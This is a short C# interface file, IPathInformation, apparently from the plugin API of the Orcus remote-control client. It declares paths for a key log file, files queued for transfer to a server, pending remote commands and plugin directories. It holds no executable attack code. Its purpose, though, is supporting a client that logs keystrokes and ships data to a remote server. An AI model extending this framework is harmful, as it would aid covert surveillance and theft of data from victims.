namespace Orcus.Plugins
{
    /// <summary>
    ///     Important paths for Orcus
    /// </summary>
    public interface IPathInformation
    {
        /// <summary>
        ///     The path of the current key log file for this Orcus client
        /// </summary>
        string KeyLogFile { get; }

        /// <summary>
        ///     The path of the exception file for this Orcus client which keeps the exceptions until the client connects to a
        ///     server
        /// </summary>
        string ExceptionFile { get; }

        /// <summary>
        ///     The path of the directory which contains the plugins of Orcus
        /// </summary>
        string PluginsDirectory { get; }

        /// <summary>
        ///     The path of the current Orcus instance
        /// </summary>
        string ApplicationPath { get; }

        /// <summary>
        ///     The directory which contains the files which should get transfered to the server
        /// </summary>
        string FileTransferTempDirectory { get; }

        /// <summary>
        ///     The directory which contains all static commands which weren't executed yet
        /// </summary>
        string PotentialCommandsDirectory { get; }

        /// <summary>
        ///     The directory which contains the static commands plugins
        /// </summary>
        string StaticCommandPluginsDirectory { get; }

        /// <summary>
        ///     Data packages which should get send to the server when the client connects
        /// </summary>
        string SendToServerPackages { get; }

        /// <summary>
        ///     The directory libraries (<see cref="PortableLibrary" />) are stored
        /// </summary>
        string LibrariesDirectory { get; }
    }
}